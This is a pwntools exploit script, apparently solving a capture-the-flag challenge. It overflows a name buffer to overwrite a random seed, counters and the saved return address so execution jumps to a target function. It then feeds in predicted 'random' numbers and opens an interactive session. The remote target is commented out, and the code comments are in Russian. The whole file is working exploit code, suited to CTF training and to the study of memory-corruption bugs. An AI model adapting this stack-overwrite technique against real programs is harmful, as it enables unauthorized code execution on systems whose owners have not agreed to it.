from pwn import *

context.arch = 'amd64'

context.terminal = ["tmux", "splitw"]
p = process('/mnt/c/Users/zahar/Downloads/random')
# p = remote('cybergon2023.webhop.me', 5003)

POTATO = 0x4011B7
rc4_not_really_random = [0x67, 0xc6, 0x69, 0x73, 0x51, 0xff, 0x4a, 0xec, 0x29, 0xcd]

p.recvuntil(b'What is your name? ')
payload = (0x80 - 0x10) * b'A'      # смещение (перезапись name)
payload += b'\x00\x00\x00\x00'      # перезапись seed
payload += b'\x00\x00\x00\x00'      # перезапись counter3
payload += b'\x00\x00\x00\x00'      # перезапись counter2
payload += b'\x00\x00\x00\x00'      # перезапись counter1
payload += b'\x00\x00\x00\x00'      # перезапись rbp
payload += b'\x00\x00\x00\x00'      # перезапись rbp
payload += p64(POTATO)              # перезапись адреса возврата
p.sendline(payload)

p.recvuntil(b'Guess my numbers!')
for x in rc4_not_really_random:
    p.sendline(str(x))

p.interactive()